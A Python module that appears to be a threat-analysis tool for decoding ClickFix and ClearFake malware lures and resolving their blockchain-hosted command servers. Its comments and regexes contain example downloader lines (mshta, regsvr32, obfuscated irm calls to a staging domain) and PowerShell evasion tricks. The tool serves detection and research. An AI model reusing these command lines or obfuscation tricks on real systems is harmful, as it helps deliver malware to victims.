import re
import base64
import requests
import functools

class PayloadDecoder:
    """
    Deobfuscation and extraction engine for ClickFix / ClearFake payloads:
    1. Base64 encoded URLs (aHR0...)
    2. PowerShell UTF-16LE (-enc ...) & LOLBAS Downloaders
    3. Generic Clipboard Injection (navigator.clipboard.writeText)
    4. MSHTA, Rundll32, Regsvr32 execution vectors
    5. ClearFake Double-XOR JavaScript
    6. Polygon / BSC Smart Contract C2 Resolver (with LRU Cache)
    """
    B64_URL_PATTERN = re.compile(r'(aHR0cHM6Ly[A-Za-z0-9+/=]{10,}|aHR0cDov[A-Za-z0-9+/=]{10,})')
    PS_ENC_PATTERN = re.compile(
        r'[-/](?:e|en|enc|enco|encod|encode|encoded|encodedc|encodedcommand)\s+["\']?([A-Za-z0-9+/=]{16,})["\']?',
        re.IGNORECASE
    )

    # Public RPC nodes for blockchain queries
    RPC_ENDPOINTS = [
        "https://polygon-rpc.com",
        "https://polygon-bor-rpc.publicnode.com",
        "https://1rpc.io/matic",
        "https://polygon.llamarpc.com",
        "https://polygon.drpc.org",
        "https://rpc.ankr.com/polygon"
    ]

    @classmethod
    def decode_b64_urls(cls, text: str) -> list[str]:
        """Finds and decodes hidden base64 URLs starting with aHR0 (http/https)"""
        found_urls = []
        matches = cls.B64_URL_PATTERN.findall(text)
        for b64 in matches:
            try:
                padding = len(b64) % 4
                if padding:
                    b64 += '=' * (4 - padding)
                decoded = base64.b64decode(b64).decode('utf-8', errors='ignore')
                urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                for u in urls:
                    if not any(b in u.lower() for b in [
                        "w3.org", "schema.org", "google.com/recaptcha",
                        "adobe.com/xap", "xml.org", "openxmlformats",
                        "purl.org", "xmlns.com"
                    ]):
                        found_urls.append(u)
            except Exception:
                pass
        return list(set(found_urls))

    @classmethod
    def decode_clipboard_commands(cls, text: str) -> list[str]:
        """
        Extracts strings copied into clipboard via:
        - navigator.clipboard.writeText(...)
        - document.execCommand('copy')
        - clipboardData.setData('text', ...)
        - Hidden inputs or variables intended for victim clipboard copy
        """
        commands = []
        # Pattern 1: navigator.clipboard.writeText(...)
        clip_matches = re.findall(r"navigator\.clipboard\.writeText\s*\(\s*(['\"`])(.*?)\1\s*\)", text, re.DOTALL | re.IGNORECASE)
        for _, cmd in clip_matches:
            cleaned = cmd.replace(r'\"', '"').replace(r"\'", "'").replace(r"\n", " ").strip()
            if cleaned:
                commands.append(cleaned)

        # Pattern 2: clipboardData.setData('text', ...)
        setdata_matches = re.findall(r"clipboardData\.setData\s*\(\s*['\"](?:text|Text)['\"]\s*,\s*(['\"`])(.*?)\1\s*\)", text, re.DOTALL | re.IGNORECASE)
        for _, cmd in setdata_matches:
            cleaned = cmd.replace(r'\"', '"').replace(r"\'", "'").replace(r"\n", " ").strip()
            if cleaned:
                commands.append(cleaned)

        # Pattern 3: String assigned to variable right before execCommand('copy')
        exec_matches = re.findall(r"(?:var|let|const)?\s*([a-zA-Z0-9_$]+)\s*=\s*(['\"`])(powershell|mshta|curl|cmd|bash.*?)\2.*?execCommand\s*\(\s*['\"]copy['\"]\s*\)", text, re.DOTALL | re.IGNORECASE)
        for _, _, cmd in exec_matches:
            commands.append(cmd.strip())

        return list(set(commands))

    @classmethod
    def deobfuscate_powershell_strings(cls, text: str) -> str:
        """Resolves string concatenation and format operator (-f) in PowerShell scripts"""
        # Remove PowerShell backtick evasion (e.g. `i`e`x -> iex)
        text_clean = re.sub(r"`([a-zA-Z])", r"\1", text)

        # Reconstruct format operators: ('{0}{1}' -f 'h','ttps://')
        def resolve_format(match):
            fmt_str = match.group(1)
            raw_args = match.group(2)
            args = re.findall(r"['\"]([^'\"]*)['\"]", raw_args)
            try:
                return f"'{fmt_str.format(*args)}'"
            except Exception:
                return match.group(0)

        text_clean = re.sub(r"['\"]([^'\"]+)['\"]\s*-f\s*([^\);]+)", resolve_format, text_clean)

        # Reconstruct string concatenation with possible parentheses: ('ht') + ('tps://')
        text_clean = re.sub(r"['\"]\s*\)?\s*\+\s*\(?\s*['\"]", "", text_clean)
        return text_clean

    @classmethod
    def decode_powershell(cls, text: str) -> list[str]:
        """
        Decodes PowerShell commands (Base64 UTF-16LE or plain text)
        and extracts secondary payload/staging URLs.
        """
        found_urls = []
        deobf_text = cls.deobfuscate_powershell_strings(text)

        # 1. Base64 UTF-16LE encoded commands
        matches = cls.PS_ENC_PATTERN.findall(text) + cls.PS_ENC_PATTERN.findall(deobf_text)
        for b64 in matches:
            try:
                b64_clean = b64.strip("\"'")
                padding = len(b64_clean) % 4
                if padding:
                    b64_clean += '=' * (4 - padding)
                decoded = base64.b64decode(b64_clean).decode('utf-16le', errors='ignore')
                urls = re.findall(r'https?://[^\s\'"<>]+', decoded)
                found_urls.extend(urls)
            except Exception:
                pass

        # 2. Plain irm / iwr / DownloadString / WebClient / BITSAdmin / Certutil / Curl
        patterns = [
            r"(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|certutil(?:\.exe)?|curl(?:\.exe)?|wget|Start-BitsTransfer)\s+.*?(?:-(?:Uri|Url|Source)\s+)?['\"\(]*\s*(https?://[^\s'\"\)\;]+)",
            r"(?:DownloadString|DownloadFile)\s*\(\s*['\"\(]*\s*(https?://[^\s'\"\)\;]+)"
        ]

        for p in patterns:
            for u in re.findall(p, deobf_text, re.IGNORECASE):
                u_clean = u.rstrip("'\"").replace(r"\/", "/")
                if "." in u_clean.split("://")[-1]:
                    found_urls.append(u_clean)

        return list(set(found_urls))

    @classmethod
    def decode_mshta(cls, text: str) -> dict:
        """
        Detects and extracts MSHTA / Rundll32 / Regsvr32 / ActiveXObject
        ClickFix execution vectors copying directly to the Run box:
        mshta "javascript:var x=new ActiveXObject('MSXML2.XMLHTTP');x.open('GET','<URL>',false);...Run(p);"
        """
        result = {
            "is_mshta": False,
            "download_url": None,
            "drop_filename": None,
            "staging_urls": []
        }
        text_lower = text.lower()
        if not ("mshta" in text_lower or "activexobject" in text_lower or "regsvr32" in text_lower or "rundll32" in text_lower):
            return result

        urls = []
        # MSHTA Direct URL: mshta https://malware.com/script.hta
        direct_mshta = re.findall(r"mshta(?:\.exe)?\s+['\"]?(https?://[^'\"\s]+)", text, re.IGNORECASE)
        urls.extend(direct_mshta)

        # Regsvr32 Scrobj: regsvr32 /u /n /s /i:http://... scrobj.dll
        regsvr_urls = re.findall(r"regsvr32(?:\.exe)?\s+.*?/i:(https?://[^\s'\"<>]+)", text, re.IGNORECASE)
        urls.extend(regsvr_urls)

        # MSXML2.XMLHTTP or ADODB.Stream or direct executable downloads
        if "MSXML2.XMLHTTP" in text or "ActiveXObject" in text or "ADODB.Stream" in text:
            result["is_mshta"] = True
            open_urls = re.findall(r"open\s*\(\s*['\"]GET['\"]\s*,\s*['\"](https?://[^'\"]+)['\"]", text, re.IGNORECASE)
            urls.extend(open_urls)
            if not urls:
                file_urls = re.findall(r"['\"](https?://[^'\"]+\.(?:exe|bat|zip|ps1|vbs|dll|hta)[^'\"]*)['\"]", text, re.IGNORECASE)
                urls.extend(file_urls)

            fn_m = re.search(r"BuildPath\([^,]+,\s*['\"]([^'\"]+)['\"]\)", text)
            if fn_m:
                result["drop_filename"] = fn_m.group(1)

        if urls:
            result["is_mshta"] = True
            for u in urls:
                u_c = u.replace(r"\/", "/")
                result["staging_urls"].append(u_c)
                if not result["download_url"]:
                    result["download_url"] = u_c

        return result

    @classmethod
    def decode_cfmd_captcha(cls, dom_or_js: str) -> dict:
        """
        Detects and decodes ClickFix / ClearFake lure frameworks:
        1. Fake Microsoft Account / Cloudflare verification dialogs
        2. Fake Claude.com / Gateway Verification (Trojanized GitHub Desktop / Electron)
        3. Fake Windows Security / MSHTA ActiveXObject execution
        4. macOS Spotlight + Terminal verification lures (secure.gateway)
        5. In-line COMMANDS object: PowerShell (Windows) and curl/bash (macOS)
        6. String concatenation & PowerShell -f format deobfuscation
        7. Staging URLs with custom X-WUA headers and WUA/ user agents
        8. Secondary batch/zip downloaders (KL.bat, KL.zip, KL.exe)
        """
        result = {
            "is_cfmd": False,
            "lure_type": None,
            "staging_urls": [],
            "live_c2_url": None,
            "delivery_url": None,
            "wua_token": None
        }

        clip_cmds = cls.decode_clipboard_commands(dom_or_js)
        has_clipboard = len(clip_cmds) > 0
        has_cfmd = "__cfmdCaptcha" in dom_or_js
        has_commands = 'COMMANDS = {"windows":' in dom_or_js or 'COMMANDS = {windows:' in dom_or_js
        has_wua = "X-WUA" in dom_or_js or "WUA/" in dom_or_js
        has_kl = "KL.bat" in dom_or_js or "KL.zip" in dom_or_js or "verify-page.js" in dom_or_js
        has_lom = "/lom/" in dom_or_js or "/lom_p2/" in dom_or_js or "/hex/lom/" in dom_or_js
        has_mshta = ("mshta" in dom_or_js.lower() and "activexobject" in dom_or_js.lower()) or "MSXML2.XMLHTTP" in dom_or_js
        has_spotlight = "open Spotlight" in dom_or_js or "secure.gateway" in dom_or_js
        has_claude_lure = "claudedevz" in dom_or_js or ("claude.com" in dom_or_js and "verification" in dom_or_js.lower()) or "cocuktekstil" in dom_or_js or "Challenge Response ID" in dom_or_js
        has_win_sec = "Windows Security" in dom_or_js and "Human verification required" in dom_or_js
        has_meet = any(m in dom_or_js.lower() for m in ["google meet", "microphone not working", "audio issue", "permission denied", "click to fix audio"])
        has_browser_update = any(b in dom_or_js.lower() for b in ["update chrome", "update your browser", "outdated browser", "browser update required"])
        has_pdf_viewer = any(p in dom_or_js.lower() for p in ["pdf viewer", "adobe reader update", "document cannot be displayed"])

        if not (has_clipboard or has_cfmd or has_commands or has_wua or has_kl or has_lom or has_mshta or has_spotlight or has_claude_lure or has_win_sec or has_meet or has_browser_update or has_pdf_viewer):
            return result

        result["is_cfmd"] = True

        if has_claude_lure:
            result["lure_type"] = "Fake Claude Verification (Trojanized Electron App / GitHub Desktop)"
        elif has_win_sec or has_mshta:
            result["lure_type"] = "Fake Windows Security (MSHTA / ActiveXObject Dropper)"
        elif has_spotlight:
            result["lure_type"] = "Fake Secure Gateway (macOS Spotlight / Terminal)"
        elif has_meet:
            result["lure_type"] = "Fake Online Meeting / Audio Check Lure"
        elif has_browser_update:
            result["lure_type"] = "Fake Web Browser Update Lure"
        elif has_pdf_viewer:
            result["lure_type"] = "Fake Document Viewer / PDF Fix"
        elif "MICROSOFT ACCOUNT" in dom_or_js or "ms_verify_you" in dom_or_js or "Confirm this sign-in" in dom_or_js:
            result["lure_type"] = "Fake Microsoft Account Verification"
        elif "cf_verify_action" in dom_or_js or "Verify you are human" in dom_or_js or "cf_needs_review" in dom_or_js or "captcha" in dom_or_js.lower():
            result["lure_type"] = "Fake Cloudflare Verification"
        elif has_kl:
            result["lure_type"] = "Fake Cloudflare / Multi-Stage Batch Dropper"
        else:
            result["lure_type"] = "ClickFix Verification Dialog"

        wua_m = re.search(r"WUA/([a-zA-Z0-9_-]+)", dom_or_js)
        if wua_m:
            result["wua_token"] = wua_m.group(1)

        urls = set()

        # Format A: Plain irm / iwr 'https://...'
        plain_m = re.findall(r"(?:irm|iwr|Invoke-WebRequest|Invoke-RestMethod)\s+(?:-(?:Uri|Url)\s+)?['\"](https?://[^'\"\s\)]+)['\"]", dom_or_js, re.IGNORECASE)
        for u in plain_m:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format B: irm (('{0}{1}' -f 'h','ttps://')+('inte'+'rnetserchinkas.co')+'/hex/lom/84aa3f59')
        f_matches = re.finditer(r"irm\s+\(\s*([^\)]+-[^\)]+)\)", dom_or_js, re.IGNORECASE)
        for fm in f_matches:
            expr = fm.group(1)
            f_op = re.search(r"'([^']*)'\s*-f\s*([^\)]+)", expr)
            prefix = ""
            if f_op:
                fmt = f_op.group(1)
                args = re.findall(r"'([^']*)'", f_op.group(2))
                try:
                    prefix = fmt.format(*args)
                except Exception:
                    prefix = "".join(args)
                expr = expr[f_op.end():]
            rem = re.findall(r"'([^']*)'", expr)
            full_url = (prefix + "".join(rem)).replace(r"\/", "/")
            if full_url.startswith("http") and "." in full_url.split("://")[-1]:
                urls.add(full_url)

        # Format C: macOS echo base64 | bash
        b64_mac = re.findall(r"echo\s+['\"]?([A-Za-z0-9+/=]{20,})['\"]?\s*\|\s*base64\s+-d", dom_or_js)
        for b in b64_mac:
            try:
                dec = base64.b64decode(b).decode("utf-8", errors="ignore")
                for uf in re.findall(r"https?://[^\s'\"<>]+", dec):
                    uf_c = uf.replace(r"\/", "/")
                    if "." in uf_c.split("://")[-1]:
                        urls.add(uf_c)
            except Exception:
                pass

        # Format D: Direct script injection (interseq.at/lom_p2/api?_v=...)
        interseq_m = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom_p2/api|verify-page\.js|KL\.bat|KL\.zip)[^\s'\"<>]*", dom_or_js)
        for u in interseq_m:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format E: Direct /lom/ or /h/ or /hex/ URLs
        direct_lom = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom|h|hex/lom)/[a-f0-9]+", dom_or_js)
        for u in direct_lom:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format F: MSHTA / ActiveXObject download URLs
        mshta_res = cls.decode_mshta(dom_or_js)
        if mshta_res["is_mshta"]:
            for u in mshta_res["staging_urls"]:
                urls.add(u)

        # Format G: Trojanized Electron / GitHub Desktop staging endpoints (/r, /g.php)
        electron_stagers = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:r|g\.php|verify-page\.js|KL\.bat|KL\.zip)[^\s'\"<>]*", dom_or_js)
        for u in electron_stagers:
            u_c = u.replace(r"\/", "/")
            if "." in u_c.split("://")[-1]:
                urls.add(u_c)

        # Format H: Generic Clipboard Extracted Commands
        for cmd in clip_cmds:
            for u in cls.decode_powershell(cmd):
                urls.add(u)
            m_res = cls.decode_mshta(cmd)
            for u in m_res.get("staging_urls", []):
                urls.add(u)
            for u in cls.decode_b64_urls(cmd):
                urls.add(u)

        clean_urls = list(urls)
        result["staging_urls"] = clean_urls
        for u in clean_urls:
            dom = u.split("://")[-1].split("/")[0].split(":")[0]
            if not result["live_c2_url"]:
                result["live_c2_url"] = f"https://{dom}"
            if not result["delivery_url"]:
                result["delivery_url"] = u

        return result


    @classmethod
    def decode_clearfake_js(cls, dom_or_js: str) -> dict:
        """
        Detects and decodes ClearFake double-XOR obfuscated JavaScript,
        then queries the blockchain smart contract to resolve the live C2!
        """
        result = {
            "is_clearfake": False,
            "smart_contract": None,
            "method_hash": None,
            "live_c2_url": None,
            "delivery_url": None
        }

        # Check for ClearFake XOR signature
        has_xor = "String.fromCharCode" in dom_or_js and "atob" in dom_or_js
        if has_xor:
            try:
                arr_m = re.search(r'\[([0-9, ]{100,})\]', dom_or_js)
                k1_var_m = re.search(r'fromCharCode\([^)]*\^\s*([a-zA-Z0-9_$]+)\)', dom_or_js)
                k2_var_m = re.search(r'charCodeAt\([^)]*\)\s*\^\s*([a-zA-Z0-9_$]+)', dom_or_js)

                if arr_m and k1_var_m and k2_var_m:
                    k1_var = k1_var_m.group(1)
                    k2_var = k2_var_m.group(1)

                    k1_val = int(re.search(rf'{re.escape(k1_var)}\s*=\s*([0-9]+)', dom_or_js).group(1))
                    k2_val = int(re.search(rf'{re.escape(k2_var)}\s*=\s*([0-9]+)', dom_or_js).group(1))

                    arr = [int(x.strip()) for x in arr_m.group(1).split(',')]

                    # Deobfuscate layer 1 (XOR) -> layer 2 (Base64) -> layer 3 (XOR)
                    s1 = ''.join([chr(x ^ k1_val) for x in arr])
                    s2 = base64.b64decode(s1)
                    deobfuscated_js = ''.join([chr(b ^ k2_val) for b in s2])

                    result["is_clearfake"] = True

                    # Extract smart contract (0x...) and method
                    contract_match = re.search(r'(0x[a-fA-F0-9]{40})', deobfuscated_js)
                    method_match = re.search(r'=\s*[\'"]([a-fA-F0-9]{8})[\'"]', deobfuscated_js)
                    secret_match = re.search(r'=\s*[\'"]([a-fA-F0-9]{32,64})[\'"]', deobfuscated_js)

                    if contract_match:
                        result["smart_contract"] = contract_match.group(1)
                    if method_match:
                        result["method_hash"] = f"0x{method_match.group(1)}"

                    # Resolve live C2 from blockchain
                    if result["smart_contract"] and result["method_hash"]:
                        live_c2 = cls.resolve_blockchain_c2(result["smart_contract"], result["method_hash"])
                        if live_c2:
                            result["live_c2_url"] = live_c2
                            if secret_match:
                                secret = secret_match.group(1)
                                result["delivery_url"] = f"{live_c2}/api.php?s={secret}"

            except Exception:
                pass

        # Check if injected C2 script tag is already rendered in the DOM
        api_match = re.search(r'(https?://([a-zA-Z0-9.-]+)/api\.php\?s=([a-f0-9]+))', dom_or_js)
        if api_match:
            result["is_clearfake"] = True
            delivery_url = api_match.group(1)
            c2_host = api_match.group(2)
            c2_base = f"https://{c2_host}"
            if not result.get("live_c2_url"):
                result["live_c2_url"] = c2_base
            if not result.get("delivery_url"):
                result["delivery_url"] = delivery_url

        return result

    @classmethod
    @functools.lru_cache(maxsize=256)
    def resolve_blockchain_c2(cls, contract_addr: str, method_hash: str) -> str:
        """
        Queries Polygon RPC nodes using eth_call to get the live C2 domain.
        LRU-cached for high performance and rate-limit immunity.
        """
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_call",
            "params": [{"to": contract_addr, "data": method_hash}, "latest"],
            "id": 1
        }

        for rpc in cls.RPC_ENDPOINTS:
            try:
                resp = requests.post(rpc, json=payload, timeout=4)
                if resp.status_code == 200:
                    raw_hex = resp.json().get("result", "")
                    if raw_hex and len(raw_hex) > 130:
                        raw = raw_hex[2:] if raw_hex.startswith("0x") else raw_hex
                        length = int(raw[64:128], 16)
                        data_hex = raw[128:128 + length * 2]
                        decoded_url = bytes.fromhex(data_hex).decode("utf-8", errors="ignore").strip('\x00')
                        if decoded_url.startswith("http"):
                            return decoded_url
            except Exception:
                continue
        return None
